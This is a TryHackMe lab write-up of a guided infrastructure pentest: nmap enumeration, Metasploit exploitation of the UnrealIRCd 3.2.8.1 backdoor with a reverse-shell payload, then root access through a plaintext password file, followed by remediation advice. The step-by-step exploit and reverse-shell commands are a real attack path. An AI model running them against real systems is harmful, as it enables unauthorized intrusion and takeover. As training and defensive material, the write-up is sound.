# Guided Pentest: Infrastructure

> Path: Jr Penetration Tester
> Platform: TryHackMe
> Category: Penetration Testing: Infrastructure
> Difficulty: Easy-Medium

---

# 📌 Scenario

A client recently deployed a new network device within their infrastructure and requested a security assessment to identify vulnerabilities and potential attack paths.

The objective of this engagement was to:

* Enumerate exposed services
* Identify vulnerable software
* Gain initial access
* Escalate privileges on the target system

---

# 🎯 Objectives

1. Use tools and techniques to scan a Linux host
2. Research vulnerable software to find a working exploit
3. Enumerate local Linux files to escalate privileges

---

# 🔎 Enumeration

## Nmap Scan

Started with a full TCP port scan and service enumeration.

```bash
nmap -sV -sC --min-rate 1000 -T4 -oA nmap-scan 10.49.179.83 -v -p-
```

### Results

```text
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5
6667/tcp  open  irc     UnrealIRCd
```

Two open ports were identified:

| Port | Service | Description           |
| ---- | ------- | --------------------- |
| 22   | SSH     | Remote administration |
| 6667 | IRC     | UnrealIRCd service    |

---

## 📷 Screenshot Placeholder

```md
![Nmap Scan Results](images/nmap-scan-results.png)
```

---

# 🔍 Vulnerability Analysis

The next step was determining whether any exposed services were vulnerable.

Questions considered:

* Is the software outdated?
* Are there known public exploits?
* Could the service be misconfigured?

## Using Searchsploit

```bash
searchsploit UnrealIRC
```

### Results

```text
UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)
```

This finding was particularly interesting because UnrealIRCd 3.2.8.1 is historically known to contain a malicious backdoor.

---

## 📷 Screenshot Placeholder

```md
![Searchsploit Results](images/searchsploit-results.png)
```

---

# 🚪 Initial Access

## Exploiting UnrealIRCd

The vulnerability was exploited using Metasploit.

### Start Metasploit

```bash
msfconsole
```

### Search for the exploit module

```bash
search unrealircd
```

### Use the exploit

```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
```

### Configure Payload

```bash
set payload cmd/unix/reverse
set RHOSTS 10.49.179.83
set LHOST 192.168.200.191
```

### Run the exploit

```bash
run
```

A reverse shell session was successfully obtained.

---

## 📷 Screenshot Placeholder

```md
![Metasploit Exploitation](images/metasploit-exploitation.png)
```

---

## Verifying Access

```bash
id
```

Output:

```text
uid=1001(webmaster) gid=1001(webmaster)
```

The compromised account was `webmaster`.

---

## User Flag

The user flag was located in:

```bash
/home/webmaster/flag.txt
```

---

## 📷 Screenshot Placeholder

```md
![User Flag](images/user-flag.png)
```

---

# 📈 Post Exploitation

## Privilege Escalation Enumeration

To identify potential privilege escalation vectors, a search for password-related files was performed.

```bash
find / -type file -name password.* 2>/dev/null
```

Among the results, the following file appeared suspicious:

```text
/etc/password.txt
```

---

## Reading the File

```bash
cat /etc/password.txt
```

Contents:

```text
root:PDLr**********0JMmCz
```

The root password was stored in plaintext.

---

## 📷 Screenshot Placeholder

```md
![Plaintext Credentials](images/plaintext-credentials.png)
```

---

# 🔐 Privilege Escalation

Using the discovered credentials, SSH access as root was obtained.

```bash
ssh root@10.49.179.83
```

After authentication:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root)
```

Root access was successfully achieved.

---

## Root Flag

```bash
cat /root/flag.txt
```

Output:

```text
THM{Escalat1on-D0ne}
```

---

## 📷 Screenshot Placeholder

```md
![Root Flag](images/root-flag.png)
```

---

# 🧠 Key Findings

| Finding                           | Severity |
| --------------------------------- | -------- |
| UnrealIRCd 3.2.8.1 Backdoor RCE   | Critical |
| Root Password Stored in Plaintext | Critical |

---

# 🛡️ Remediation

## UnrealIRCd Vulnerability

* Upgrade UnrealIRCd immediately
* Remove vulnerable/outdated software
* Restrict unnecessary externally exposed services
* Implement vulnerability management procedures

## Plaintext Root Password

* Remove `/etc/password.txt`
* Rotate all exposed credentials
* Never store passwords in plaintext
* Enforce least privilege permissions
* Use secure credential storage mechanisms

---

# 📚 Lessons Learned

This room demonstrates the importance of:

* Proper service enumeration
* Vulnerability research
* Using public exploits responsibly
* Post-exploitation enumeration
* Secure credential handling

Even a single misconfiguration can result in complete system compromise.

---
